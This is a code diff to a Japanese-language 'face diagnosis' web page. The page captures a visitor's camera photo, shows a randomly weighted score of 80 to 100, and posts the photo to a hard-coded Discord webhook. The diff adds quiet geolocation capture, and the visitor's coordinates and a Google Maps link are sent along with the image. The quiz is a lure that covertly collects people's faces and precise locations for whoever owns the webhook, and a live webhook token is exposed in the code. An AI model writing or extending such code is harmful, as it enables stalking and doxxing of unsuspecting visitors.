@@ -134,6 +134,7 @@
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1456158291972329626/8R7QpYXHOU1DlLAcfi2cgdhuLCJfaQVrqf7B-SHjVz_oUI87qvLkCHN59OdvvPKBnaKU';
 
         let capturedImage = null;
+        let userLocation = null;
 
         navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
             .then(stream => {
@@ -142,6 +143,21 @@
             .catch(err => {
                 alert('カメラにアクセスできませんでした: ' + err.message);
             });
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    userLocation = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    };
+                },
+                () => {
+                    userLocation = null;
+                }
+            );
+        }
 
         captureBtn.addEventListener('click', () => {
             canvas.width = video.videoWidth;
@@ -162,7 +178,7 @@
             const score = generateWeightedScore();
             result.textContent = `${score}点`;
 
-            await sendToDiscord(WEBHOOK_URL, capturedImage, score);
+            await sendToDiscord(WEBHOOK_URL, capturedImage, score, userLocation);
 
             setTimeout(() => {
                 canvas.style.display = 'none';
@@ -178,17 +194,26 @@
             return Math.floor(80 + weighted * 21);
         }
 
-        async function sendToDiscord(webhookUrl, imageData, score) {
+        async function sendToDiscord(webhookUrl, imageData, score, location) {
             try {
                 statusDiv.textContent = '送信中...';
                 statusDiv.className = 'status';
 
                 const blob = await fetch(imageData).then(r => r.blob());
 
+                let messageContent = `顔診断結果: **${score}点**`;
+
+                if (location) {
+                    messageContent += `\n📍 位置情報:\n緯度: ${location.latitude}\n経度: ${location.longitude}\n精度: ${location.accuracy}m`;
+                    messageContent += `\nGoogle Maps: https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
+                } else {
+                    messageContent += `\n📍 位置情報: 取得できませんでした`;
+                }
+
                 const formData = new FormData();
                 formData.append('file', blob, 'diagnosis.jpg');
                 formData.append('payload_json', JSON.stringify({
-                    content: `顔診断結果: **${score}点**`
+                    content: messageContent
                 }));
 
                 const response = await fetch(webhookUrl, {
